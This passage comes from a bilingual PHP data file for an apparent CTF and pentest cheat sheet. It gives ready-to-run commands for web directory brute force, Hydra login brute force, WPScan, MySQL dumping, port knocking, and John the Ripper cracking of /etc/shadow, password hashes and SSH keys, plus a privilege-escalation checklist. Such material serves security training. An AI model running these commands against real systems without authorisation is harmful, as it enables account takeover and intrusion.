dirb http://10.10.10.11  -X .php
```

<br/>


<h5>Gobuster</h5>
```
https://github.com/OJ/gobuster
```

Le télécharger et l\'installer en /opt
```
wget https://github.com/OJ/gobuster/releases/download/v3.0.1/gobuster-linux-amd64.7z
sudo apt install p7zip-full
7z x gobuster-linux-amd64.7z
sudo cp gobuster-linux-amd64/gobuster /opt/gobuster
chmod a+x /opt/gobuster
```


Bruteforce le site http://10.10.10.11, avec la liste directory-list-2.3-medium.txt, avec des extensions de fichier html,php,txt
```
/opt/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.11  -l -x html,php,txt
```


Pour une url en HTTPS, ajouter l\'option de ligne de commande
```
-k : skip HTTPS ssl verification
```


',
    'title_en' => '80: HTTP - Directory and files bruteforce',
    'desc_en' => '## 80: HTTP - Directory and files bruteforce

Bruteforcing a website consists in testing the presence of accessible pages, such as /register, /register.php, /admin, /upload, /users/login.txt, /admin/password.sav, ...
For this there are lists of directories and filenames frequently found on web servers.<br/>
<br/>
Once web server langage/framework is known (php, java, cgi / wordpress, joomla, ...), it is possible to use optimized lists, and search only the appropriate extensions.: php, php4, php5, exe, jsp, ...<br/>
It is also possible to search for files with interesting extensions. : cfg, txt, sav, jar, zip, sh, ...

<br/>
Usual web brute force software :
<ul>
<li>dirb: Command line. To be used for a quick check, with its list \'common.txt\'.</li>
<li>gobuster: Command line. To be used with the list \'directory-list-2.3-medium.txt\' from dirbuster</li>
<li>dirbuster: GUI. With a Gui, but not the best choice.</li>
</ul>

It is crucial to choose the right list of directories/filenames:
<ul>
<li>/usr/share/wordlists/dirb/common.txt: Small well-constructed list</li>
<li>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: Big list. Should covers all CTFs.</li>
<li>https://github.com/danielmiessler/SecLists : Once comfortable with the two previous lists, it is possible to find more optimized lists at this address.
<li>On Kali and Parrot distributions, the /usr/share/wordlists directory contains links to many lists. Take the time to look at it in detail.</li>
</ul>
<br/>

<h5>Dirb</h5>
Dirb is usually preinstalled on Kali or Parrot. If not:
```
sudo apt-get install -y dirb
```

Run a quick scan with dirb, whith its default \'common.txt\' list:
```
dirb http://10.10.10.11
```


Find files with .php file extension:
```
dirb http://10.10.10.11  -X .php
```

<br/>

<h5>Gobuster</h5>
```
https://github.com/OJ/gobuster
```

Download and install in /opt
```
wget https://github.com/OJ/gobuster/releases/download/v3.0.1/gobuster-linux-amd64.7z
sudo apt install p7zip-full
7z x gobuster-linux-amd64.7z
sudo cp gobuster-linux-amd64/gobuster /opt/gobuster
chmod a+x /opt/gobuster
```


Bruteforce http://10.10.10.11, with the list \'directory-list-2.3-medium.txt\', and file extensions html,php,txt:
```
/opt/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.11  -l -x html,php,txt
```


For an HTTPS url, add the command line option
```
-k : skip HTTPS ssl verification
```


',
  ),
  'NetworkDiscovery-80HTTPbrutebasicauth' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPbrutebasicauth',
    'title' => '80: HTTP - Basic Auth - Brute force',
    'desc' => '## 80: HTTP - Basic Auth - Brute force

<h5>Hydra</h5>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f 10.10.10.157 http-get /monitoring
```

```
-l login
-P password file
-f server adress
http-get : HTTP request type
/monitoring : url path
```


',
    'title_en' => '80: HTTP - Basic Auth - Brute force',
    'desc_en' => '## 80: HTTP - Basic Auth - Brute force

<h5>Hydra</h5>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f 10.10.10.157 http-get /monitoring
```

```
-l login
-P password file
-f server adress
http-get : HTTP request type
/monitoring : url path
```


',
  ),
  'NetworkDiscovery-80HTTPbruteformpost' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPbruteformpost',
    'title' => '80: HTTP - Form HTTP Post - Authent brute force',
    'desc' => '## 80: HTTP - Form HTTP Post - Authent brute force

<h5>Hydra</h5>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 http-post-form \'/admin/login.php:username=^USER^&password=^PASS^:F=Wrong password:H=Cookie\\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4\' -V
```

Attention si la réponse est un 302 Redirect, hydra ne va pas suivre et va générer un faux positif.

',
    'title_en' => '80: HTTP - HTML Form POST - Authentication brute force',
    'desc_en' => '## 80: HTTP - HTML Form POST - Authentication brute force

<h5>Hydra</h5>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 http-post-form \'/admin/login.php:username=^USER^&password=^PASS^:F=Wrong password:H=Cookie\\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4\' -V
```

Beware if the answer is a 302 Redirect, hydra will not follow and will generate a false positive.
',
  ),
  'NetworkDiscovery-80HTTPbruteformget' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPbruteformget',
    'title' => '80: HTTP - Form HTTP GET - Brute force',
    'desc' => '## 80: HTTP - Form HTTP GET - Brute force

<h5>Hydra</h5>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.4 http-get-form \'/login.php:username=^USER^&password=^PASS^:F=Login failed:H=Cookie\\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4\' -V
```

Attention si la réponse est un 302 Redirect, hydra ne va pas suivre et va générer un faux positif.

',
    'title_en' => '80: HTTP - Form HTTP GET - Brute force',
    'desc_en' => '## 80: HTTP - Form HTTP GET - Brute force

<h5>Hydra</h5>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.4 http-get-form \'/login.php:username=^USER^&password=^PASS^:F=Login failed:H=Cookie\\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4\' -V
```

Beware if the answer is a 302 Redirect, hydra will not follow and will generate a false positive.
',
  ),
  'NetworkDiscovery-wordpress' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'wordpress',
    'title' => 'CMS: Wordpress',
    'desc' => '## CMS: Wordpress

<h5>Wordpress</h5>

Format des urls
```
Posts : /index.php?p=22
/index.php/2017/04/12/hello-world/
/index.php/jobs/apply/8/
Login : /wp-login/
/wp-login.php
Uploaded files : /wp-content/uploads/%year%/%month%/%filename%
```


Fichier de config, et credentials de la base de donnée
```
/var/www/html/
wordpress/wp-config.php
wordpress/htdocs/wp-config.php
```


<h5>Wpscan</h5>
Wpscan connait la structure d\'un site wordpress et va faire du brute force pour identifier les pages, le posts, les users, le thème, les plugins.<br/>
Les failles de wordpress viennent essentiellement des plugins non mis à jour.
```
wpscan --url http://10.10.10.10/wordpress/ -e
--url : url de la page wordpress.
-e : énumeration
```

Brute force du login
```
wpscan --url http://10.10.10.10/wordpress/  -P rockyou.txt -U admin
```


',
    'title_en' => 'CMS: Wordpress',
    'desc_en' => '## CMS: Wordpress

<h5>Wordpress</h5>

URLs format:
```
Posts : /index.php?p=22
/index.php/2017/04/12/hello-world/
/index.php/jobs/apply/8/
Login : /wp-login/
/wp-login.php
Uploaded files : /wp-content/uploads/%year%/%month%/%filename%
```


Config file and database credentials
```
/var/www/html/
wordpress/wp-config.php
wordpress/htdocs/wp-config.php
```


<h5>Wpscan</h5>
Wpscan knows the structure of a wordpress site and will make brute force to identify the pages, the posts, the users, the theme, the plugins.<br/>
Wordpress flaws are mainly due to non-updated plugins.
```
wpscan --url http://10.10.10.10/wordpress/ -e
--url : wordpress url
-e : enum pages, posts, users, theme, plugins, ...
```

Login bruteforce
```
wpscan --url http://10.10.10.10/wordpress/  -P rockyou.txt -U admin
```


',
  ),
  'NetworkDiscovery-110POP3' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '110POP3',
    'title' => '110: POP3',
    'desc' => '## 110: POP3

Le protocole POP3 sert à relever ses mails sur un serveur distant.
Si vous avez les identifiants et mots de passe, connectez vous en netcat ou telnet.
```
$ nc 10.0.12.10 110
```

Une fois connecté, s\'authentifier avec
```
USER XXXXXX
PASS XXXXXX
```

Afficher la liste des mails avec:
```
LIST
```

Lire le mail numéro 1
```
RETR 1
```

Quitter le serveur.
```
QUIT
```


',
    'title_en' => '110: POP3',
    'desc_en' => '## 110: POP3

POP3 protocol is used to get your mails from a distant server.
If you have the login/password, connect thanks to netcat or telnet
```
$ nc 10.0.12.10 110
```

Once connected, authenticate with login/password
```
USER XXXXXX
PASS XXXXXX
```

Get the mails list
```
LIST
```

Read mail number 1
```
RETR 1
```

Quit the server.
```
QUIT
```


',
  ),
  'NetworkDiscovery-110POP3BF' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '110POP3BF',
    'title' => '110: POP3 Bruteforce',
    'desc' => '## 110: POP3 Bruteforce

L\'authentification POP3 peut être brute forcée avec hydra.
```
hydra -V -l username -P wordlist.txt 10.0.12.10 pop3
```


',
    'title_en' => '110: POP3 Bruteforce',
    'desc_en' => '## 110: POP3 Bruteforce

Use hydra to bruteforce POP3 authent.
```
hydra -V -l username -P wordlist.txt 10.0.12.10 pop3
```


',
  ),
  'NetworkDiscovery-3306MySQL' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '3306MySQL',
    'title' => '3306: MySQL',
    'desc' => '## 3306: MySQL

Si vous avez les identifiants et mots de passe. Se connecter avec le client mysql.
```
mysql --host=HOST -u USER -p
--host=précise le nom du serveur
-u le login
-p force la saisie du mot de passe.
```

Dumper le contenu de la base.
```
show databases; -- Liste les bases de données.
-- La base \'information_schema\' contient des informations internes à mysql ou mariadb. On peut généralement l\'ignorer.
use DATABASE;
show tables;    -- Liste les tables
SELECT * FROM TABLENAME;
quit;
```


',
    'title_en' => '3306: MySQL',
    'desc_en' => '## 3306: MySQL

You have found database credentials in config file. Let use mysql client to connect and dump the database.
```
mysql --host=HOST -u USER -p
--host xx : Server IP or name
-u xx     : login
-p        : manually enter the password.
```

List databases.<br/>
```
show databases;
```

Ignore internal databases and choose the application database.<br/>
The database \'information_schema\' contains internal information of mysql or mariadb. It can generally be ignored.<br/>
Select the aplication database, list tables, then dump interresting tables such as \'users\'.
```
use DATABASE;
show tables;
SELECT * FROM TABLENAME;
quit;
```


',
  ),
  'NetworkDiscovery-PORTKNOCK' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'PORTKNOCK',
    'title' => 'Port knocking',
    'desc' => '## Port knocking

Pour rendre certains services invisibles aux scans, les serveurs peuvent utiliser une fonctionnalité de Port Knocking.
Les ports sensibles ne sont ouverts qu\'une fois une séquence particulière de paquets reçus, idéalement en UDP.
Cette fonctionnalité peut être implémentée directement dans le routeur, le firewall ou l\'application.
Envoyer un unique paquet vide en UDP sur le port 1337
```
nc -u -z localhost 1337
```

Envoyer une série de paquets vides sur les port UDP 1337 4444 6666
```
nc -u -z localhost 1337 4444 6666
```

Envoyer un unique paquet contenant le message KnockKnockKnock sur le port UDP 1337
```
for i in 10124 11056 18639; do printf Knock | nc -u -q1 localhost $i; done
```



',
    'title_en' => 'Port knocking',
    'desc_en' => '## Port knocking

Pour rendre certains services invisibles aux scans, les serveurs peuvent utiliser une fonctionnalité de Port Knocking.
Les ports sensibles ne sont ouverts qu\'une fois une séquence particulière de paquets reçus, idéalement en UDP.
Cette fonctionnalité peut être implémentée directement dans le routeur, le firewall ou l\'application.

Envoyer un unique paquet vide en UDP sur le port 1337
```
nc -u -z localhost 1337
```

Envoyer une série de paquets vides sur les port UDP 1337 4444 6666
```
nc -u -z localhost 1337 4444 6666
```

Envoyer un unique paquet contenant le message KnockKnockKnock sur le port UDP 1337
```
printf KnockKnockKnock | nc -u -q1 localhost 1337
```

Envoyer une série de paquets contenant le message KnockKnockKnock sur les port UDP 1337 4444 6666
```
for i in 1337 4444 6666; do printf Knock | nc -u -q1 localhost $i; done
```



',
  ),
  'Password-intro' => 
  array (
    'category' => 'Password',
    'id' => 'intro',
    'title' => 'Passwords',
    'desc' => '## Passwords

Outils et listes de mots de passe.

',
    'title_en' => 'Passwords',
    'desc_en' => '## Passwords

Brute force tools and password lists.

',
  ),
  'Password-password' => 
  array (
    'category' => 'Password',
    'id' => 'password',
    'title' => 'Deviner un mot de passe',
    'desc' => '## Deviner un mot de passe

Quand il faut choisir un mot de passe, ça tombe toujours au plus mauvais moment.<br/>
Et comme, en plus, il faut s\'en souvenir... les mots de passe sont souvent basés sur des notions simples: prénom, marque, souvenir...<br/>
<br/>
Heureusement, les responsables de la sécurité imposent des politiques de gestion des mots de passe, conçues pour éviter ces dérives... <br/>
Enfin, il faut le dire vite ;)<br/>
Dans 90% des cas, la majuscule est en début de mot de passe, les chiffres et le caractère spécial à la fin...<br/>
Evitez d\'utiliser Vacances12! comme mot de passe...

',
    'title_en' => 'Guess the password',
    'desc_en' => '## Guess the password

When it comes to choosing a password, it always comes at the worst possible time.<br/>
And since, moreover, it is necessary to remember it... passwords are often based on simple notions: first name, brand, memory...<br/>
<br/>
Fortunately, security managers impose password management policies designed to prevent these abuses... <br/>
Well, ...<br/>
In 90% of the cases, the capital letter is at the beginning of the password, the numbers and the special character at the end...<br/>
Please stop using Ferrari12$ as password...

',
  ),
  'Password-rockyou' => 
  array (
    'category' => 'Password',
    'id' => 'rockyou',
    'title' => 'Liste de mots de passe : Rockyou.txt',
    'desc' => '## Liste de mots de passe : Rockyou.txt

RockYou, une société basée en Californie, permettait de s\'authentifier sur des application facebook sans avoir à saisir de mots de passe. En décembre 2009, elle s\'est fait hacker. <br/>
<br/>
La base de données contenant les noms et mots de passe en clair de ses 32 millions de clients a été volée puis rendue publique.<br/>
Une analyse des mots de passe à montré que les deux tiers des mots de passe faisaient moins de 6 caractères, et que le mot de passe le plus utilisé était 123456.<br/>
<br/>
Cette liste des mots de passes, triés par fréquence est fréquement utilisée dans les CTF.<br/>
Sur Kali, le fichier, zippé, est rangé en : /usr/share/wordlists/rockyou.zip<br/>
Dans le terminal, pour prendre de bonnes habitudes, le fichier est rangé en : /usr/share/wordlists/rockyou.txt<br/>
<br/>
<a href=\'rockyou.txt\'>fichier de mots de passe Rockyou: rockyou.txt</a>

',
    'title_en' => 'Password list : Rockyou.txt',
    'desc_en' => '## Password list : Rockyou.txt

RockYou, a California based company, made it possible to authenticate on facebook applications without having to re-enter passwords. In December 2009, it was hacked. <br/>
<br/>
The database containing the unencrypted names and passwords of its 32 million customers was stolen and then made public.<br/>
An analysis of the passwords showed that two thirds of the passwords were less than 6 characters long, and that the most commonly used password was 123456.<br/>
<br/>
This list of passwords, sorted by frequency is frequently used in CTF.<br/>
On Kali, the file, zipped, is stored in: /usr/share/wordlists/rockyou.zip<br/>
In the terminal, to get into good habits, the file can be found at: /usr/share/wordlists/rockyou.txt<br/>
<br/>
<a href=\'rockyou.txt\'>password list Rockyou: rockyou.txt</a>

',
  ),
  'Password-fuite' => 
  array (
    'category' => 'Password',
    'id' => 'fuite',
    'title' => 'Firefox Monitor',
    'desc' => '## Firefox Monitor

Pour savoir si ton adresse email est présente dans une fuite de donnée, tu peux utiliser le service de Firefox Monitor.<br/>
https://monitor.firefox.com/

',
    'title_en' => 'Firefox Monitor',
    'desc_en' => '## Firefox Monitor

To find out if your email address is present in a data leak, use the Firefox Monitor service.<br/>
https://monitor.firefox.com/

',
  ),
  'Password-hash' => 
  array (
    'category' => 'Password',
    'id' => 'hash',
    'title' => 'Hash',
    'desc' => '## Hash

Un professionnel ne garde jamais un mot de passe en clair. <br/>
Il enregistre un Hash.<br/>
<br/>
Un Hash est généré par une fonction mathématique à partir du mot de passe de l\'utilisateur. <br/>
Quand l\'utilisateur saisit son mot de passe, le logiciel calcule le Hash et le transmet au serveur qui le compare avec le Hash qu\'il a stocké.
Si les deux Hash coincident, alors l\'utilisateur connait le mot de passe, et est authentifié.<br/>
Si un curieux sniffe les messages, il ne verra pas le mot de passe, juste le Hash.<br/>
Connaissant le Hash, il est compliqué de retrouver le mot de passe.<br/>
<br/>
Pour calculer un Hash du mot de passe \'123456\' avec la fonction MD5, utilise la commande suivante dans le terminal :<br/>
$ printf \'123456\' | md5sum<br/>
123456 donnera toujours le même Hash MD5.<br/>
<br/>
La fonction MD5 a été très utilisée par le passé, mais la puissance des processeurs actuels impose l\'utilisation de fonctions plus complexes à craquer comme SHA1, SHA256 ou SHA512.<br/>
La taille du Hash augmente avec la complexité de l\'algorithme.<br/>
<br/>
printf \'123456\' | sha1sum<br/>
7c4a8d09ca3762af61e59520943dc26494f8941b<br/>
<br/>
printf \'123456\' | sha256sum<br/>
8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 <br/>
<br/>
Note: on utilise \'printf\' et pas \'echo\' pour un calcul de Hash. Echo ajoute un saut de ligne qui est pris en compte par le Hash.

',
    'title_en' => 'Hash',
    'desc_en' => '## Hash

A professional never keeps a password. <br/>
It records a hash.<br/>
<br/>
A hash is generated by a mathematical function from the user\'s password. <br/>
When the user enters his password, the software calculates the hash and sends it to the server which compares it with the hash it has stored.
If the two hashes match, then the user knows the password, and is authenticated.
If someone sniffs the messages, he won\'t see the password, just the Hash.<br/>
Knowing the Hash, it is complicated to retrieve the password.
<br/>
To calculate a Hash of the password \'123456\' with the MD5 function, use the following command in the terminal :<br/>
$ printf \'123456\' | md5sum<br/>
123456 will always give the same MD5 Hash.<br/>
<br/>
The MD5 function has been widely used in the past, but the power of today\'s processors requires the use of more complex functions to be cracked such as SHA1, SHA256 or SHA512.<br/>.
The size of the hash increases with the complexity of the algorithm.<br/><br/>
printf \'123456\' | sha1sum<br/>
7c4a8d09ca3762af61e59520943dc26494f8941b<br/>
<br/>
printf \'123456\' | sha256sum<br/>
8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 <br/>
<br/>
Note: we use \'printf\' and not \'echo\' for a hash calculation. Echo adds a line break which is taken into account by the Hash.

',
  ),
  'Password-hashonline' => 
  array (
    'category' => 'Password',
    'id' => 'hashonline',
    'title' => 'Online Hash crack',
    'desc' => '## Online Hash crack

Use online services to crack hash:<br/>
- Crackstation : https://crackstation.net/

Try: e10adc3949ba59abbe56e057f20f883e

',
    'title_en' => 'Online Hash crack',
    'desc_en' => '## Online Hash crack

Use online services to crack hash:<br/>
- Crackstation : https://crackstation.net/

Try: e10adc3949ba59abbe56e057f20f883e

',
  ),
  'Password-etcpasswd' => 
  array (
    'category' => 'Password',
    'id' => 'etcpasswd',
    'title' => '/etc/passwd',
    'desc' => '## /etc/passwd

Le fichier /etc/passwd est un fichier texte dont chaque ligne décrit un compte d\'utilisateur.<br/>
Chaque ligne se compose de sept champs séparés par un deux-points. <br/>
Voici un exemple d\'un enregistrement :<br/>
```
jsmith:x:1001:1000:Joe Smith,Room 1007,(234)555-8910,(234)5550044,email:/home/jsmith:/bin/sh
```

Les champs, de gauche à droite, sont :<br/>
<br/>
<ul>
<li>jsmith : le nom de l\'utilisateur (login name). </li>
<li>x : un x signifie que le hash du mots de passe est stocké, dans le fichier /etc/shadow qui n\'est lisible que par le compte \'root\'. Un * empêche les connexions d\'un compte tout en conservant son nom d\'utilisateur. Dans les premières version d\'unix, ce champ contenait le hachage cryptographique du mot de passe de l\'utilisateur.</li>
<li>1001 : l\'identifiant d\'utilisateur.</li>
<li>1000 : l\'identifiant de groupe. Un nombre qui identifie le groupe principal de l\'utilisateur. </li>
<li>Joe Smith,Room 1007,(234)555-8910,(234)5550044,email : le champ Gecos. Un commentaire qui décrit la personne ou le compte. Généralement, il s\'agit d\'un ensemble de valeurs séparées par des virgules, fournissant le nom complet de l\'utilisateur et ses coordonnées.</li>
<li>/home/jsmith : le chemin vers le répertoire personnel de l\'utilisateur.</li>
<li>/bin/sh : le programme qui est lancé chaque fois que l\'utilisateur se connecte au système. Peut être nologin.</li>
</ul>
Les premières lignes du fichier sont généralement des comptes systèmes.<br/>
Les comptes utilisateurs sont souvent décrits dans les dernière lignes.<br/>
Ce fichier permet d\'identifier rapidement les utlisateurs, les applications (tomcat, mysql, www_data,...), leurs répertoires de travail, et s\'ils ont ou non accès à un shell.<br/>
<a href=\'https://fr.wikipedia.org/wiki/Passwd\'>Article sur Wikipedia: https://fr.wikipedia.org/wiki/Passwd</a>

',
    'title_en' => '/etc/passwd',
    'desc_en' => '## /etc/passwd

The /etc/passwd file is a text file with each line describing a user account.<br/>
Each line consists of seven fields separated by a colon.<br/>
Here is an example of a recording:<br/>
```
jsmith:x:1001:1000:Joe Smith,Room 1007,(234)555-8910,(234)5550044,email:/home/jsmith:/bin/sh
```

<ul>
<li>jsmith: login name. </li>
<li>x : a x means password hash is stored in the /etc/shadow file, which is only readable by the root account. A * prevents connections from an account while keeping its username. In early versions of unix, this field contained the cryptographic hash of the user\'s password.</li>
<li>1001 : UID - User ID</li>
<li>1000 : GID - Group ID. A number, identifying the user main group. </li>
<li>Joe Smith,Room 1007,(234)555-8910,(234)5550044,email : Gecos field. A comment that describes the person or account. Usually a comma-separated set of values, providing the user\'s full name and contact information.</li>
<li>/home/jsmith : account home directory.</li>
<li>/bin/sh : shell program used by the user. Can be nologin.</li>
</ul>
The first lines of the file are usually system accounts.<br/>
User accounts are often described in the last lines.<br/>
This file allows to quickly identify users, applications (tomcat, mysql, www_data,...), their working directories, and whether or not they have access to a shell.<br/>
<br/>
Wikipedia: https://en.wikipedia.org/wiki/Passwd

',
  ),
  'Password-john' => 
  array (
    'category' => 'Password',
    'id' => 'john',
    'title' => 'Hash crack: John the ripper',
    'desc' => '## Hash crack: John the ripper

John The ripper permet de vérifier si un hash correspond à un mot de passe présent dans une liste.<br/>
<br/>
Enregistrer un ou plusieurs Hash dans le fichier hash.txt
```
$ echo \'root:$1$1337$WmteYFHyEYyx2MDVXln7Y1\' >hash.txt
$ echo \'wordpressuser1:$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0\' >>hash.txt```


Utiliser John the ripper pour casser le mot de passe en se servant sa liste de mots de passe interne:
```
$ john hash.txt```


Utiliser John the ripper pour casser le mot de passe en se servant de la liste Rockyou:
```
$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt```


John n\'affiche plus les mots de passe qu\'il a déjà cassé.<br/>
Pour afficher ces mots de passe:
```
$ john hash.txt --show ```


Il existe plusieurs version de John sur Internet.
Les distributions Kali et Parrot, installent la version John Community Enhanced -jumbo.
Cette distribution est disponible en https://github.com/openwall/john
```
$ sudo snap install john-the-ripper
$ john
John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit 64 AVX2 AC]```


',
    'title_en' => 'Hash crack: John the ripper',
    'desc_en' => '## Hash crack: John the ripper

John The ripper allows to check if a hash corresponds to a password present in a list.<br/>
<br/>
Save one or more hashes in hash.txt file.
```
$ echo \'root:$1$1337$WmteYFHyEYyx2MDVXln7Y1\' >hash.txt
$ echo \'wordpressuser1:$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0\' >>hash.txt```


Use John the ripper to break the password using its internal password list:
```
$ john hash.txt```


Use John the ripper to break the password using the Rockyou list:
```
$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt```


John no longer displays passwords he has already broken.<br/>
To view these passwords:
```
$ john hash.txt --show ```


There are several versions of John on the Internet.
The Kali and Parrot distributions, install the John Community Enhanced -jumbo version.
This distribution is available at https://github.com/openwall/john
```
$ sudo snap install john-the-ripper
$ john
John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit 64 AVX2 AC]```


',
  ),
  'Password-johnshadow' => 
  array (
    'category' => 'Password',
    'id' => 'johnshadow',
    'title' => 'John - /etc/passwd /etc/shadow',
    'desc' => '## John - /etc/passwd /etc/shadow

Bruteforcer /etc/shadows avec John:<br/>
```
$ unshadow /etc/passwd /etc/shadow > hash.txt
$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt
$ john hash.txt --show
```


',
    'title_en' => 'John - /etc/passwd /etc/shadow',
    'desc_en' => '## John - /etc/passwd /etc/shadow

Bruteforce /etc/shadows with John:<br/>
```
$ unshadow /etc/passwd /etc/shadow > hash.txt
$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt
$ john hash.txt --show
```


',
  ),
  'Password-johnmysql' => 
  array (
    'category' => 'Password',
    'id' => 'johnmysql',
    'title' => 'John - MySQL Hash',
    'desc' => '## John - MySQL Hash

Bruteforcer un hash My SQL avec John:<br/>
```
mysql -u dbuser -p drupaldb
show databases;
show tables;
select name, pass from users;
exit
-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
|       |                                                         |
| admin | $S$DvQI6Y6xxxxxxxxxxxxxxxxxxxxxxxxxEDTCP9nS5.i38jnEKuDR |
| Fxxxx | $S$DWGrxefxxxxxxxxxxxxxxxxxxxxxxxxxxxx3QBwC0EkvBQ/9TCGg |
| ..... | $S$Drpxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/x/4ukZ.RXi |
+-------+---------------------------------------------------------+

echo \'$S$DWGrxefxxxxxxxxxxxxxxxxxxxxxxxxxxxx3QBwC0EkvBQ/9TCGg\'>hash.txt
$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt
$ john hash.txt --show
```


',
    'title_en' => 'John - MySQL Hash',
    'desc_en' => '## John - MySQL Hash

Bruteforce MySQL Hash with John:<br/>
```
mysql -u dbuser -p drupaldb
show databases;
show tables;
select name, pass from users;
exit
-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
|       |                                                         |
| admin | $S$DvQI6Y6xxxxxxxxxxxxxxxxxxxxxxxxxEDTCP9nS5.i38jnEKuDR |
| Fxxxx | $S$DWGrxefxxxxxxxxxxxxxxxxxxxxxxxxxxxx3QBwC0EkvBQ/9TCGg |
| ..... | $S$Drpxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/x/4ukZ.RXi |
+-------+---------------------------------------------------------+

echo \'$S$DWGrxefxxxxxxxxxxxxxxxxxxxxxxxxxxxx3QBwC0EkvBQ/9TCGg\'>hash.txt
$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt
$ john hash.txt --show
```


',
  ),
  'Password-johnsshrsa' => 
  array (
    'category' => 'Password',
    'id' => 'johnsshrsa',
    'title' => 'John - Password protected SSH RSA Key',
    'desc' => '## John - Password protected SSH RSA Key

Bruteforce a pasword protected id_rsa id (id used for ssh connections):<br/>
<br/>
RSA header:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25325A9B318F344B8391AFD767D6D

NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
```

Let check if the password is in the Rockyou list.
```

$ python  /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
$ john hash.txt --show
```



',
    'title_en' => 'John - Password protected SSH RSA Key',
    'desc_en' => '## John - Password protected SSH RSA Key

Bruteforce a pasword protected id_rsa id (id used for ssh connections):<br/>
<br/>
RSA header:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25325A9B318F344B8391AFD767D6D

NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
```

Let check if the password is in the Rockyou list.
```

$ python  /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
$ john hash.txt --show
```



',
  ),
  'PrivEscUx-intro' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'intro',
    'title' => 'Elevation de Privilege - Unix',
    'desc' => '## Elevation de Privilege - Unix

Techniques d\'élévation de privilège pour Unix.

',
    'title_en' => 'Privilege Elevation - Unix',
    'desc_en' => '## Privilege Elevation - Unix

Privilege elevation techniques for Unix.

',
  ),
  'PrivEscUx-privelev' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'privelev',
    'title' => 'Principe',
    'desc' => '## Principe

Nous venons tout juste d\'obtenir l\'accès en shell à un serveur.
Nous allons commencer par faire un inventaire exhaustif de ce qui est accessible au compte sur lequel nous pouvons executer des commandes.<br/>
- Identifier l\'OS, sa version, les patchs de sécurité manquants
- Recenser les outils disponibles : netcat, python, perl..
- Lire tous les fichiers de config, temporaires, backup pour trouver des login/password.<br/>
- Utiliser les éventuels droits sudo du compte.<br/>
- Trouver une commande avec SetUID bit.<br/>
- Trouver un process qui tourne en tache de fond avec des droits root et modifier ses inputs.<br/>
- Trouver un exploit kernel. Cette dernière option, radicale car elle peut planter la machine, est trés efficace sur les vieux serveurs...

Sur ses premières machines, il est préférable de faire ces énumérations en lançant les commandes manuellement pour s\'approprier les options et les outputs. Une fois à l\'aise, et sachant ce que l\'on cherche, il est possible d\'utiliser des scripts qui font ces énumérations pour nous.

',
    'title_en' => 'Principle',
    'desc_en' => '## Principle

You just got shell access to a server.
Let start by an exhaustive inventory of what is accessible to your account.<br/>
- Identify the OS, its version, the missing security patches
- List available tools: netcat, python, perl...
- Read all config, temporary, backup files to find login/password.<br/>
- Use the possible sudo rights of the account.<br/>
- Find commands with SetUID bit.<br/>
- Find a process running in the background with root rights and modify its inputs.<br/>
- Find a kernel exploit. This last option, radical because it can crash the machine, is very efficient on old servers...

On your first servers, it is preferable to make these enumerations by launching the commands manually, so you can appropriate the options and outputs. Once comfortable, and knowing what you are looking for, feel free to use scripts that do these enumerations for you.

',
  ),
  'PrivEscUx-section' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'section',
    'title' => 'Fichiers contenant des informations',
    'desc' => '## Fichiers contenant des informations

',
    'title_en' => 'Files containing usefull informations',
    'desc_en' => '## Files containing usefull informations

',
  ),
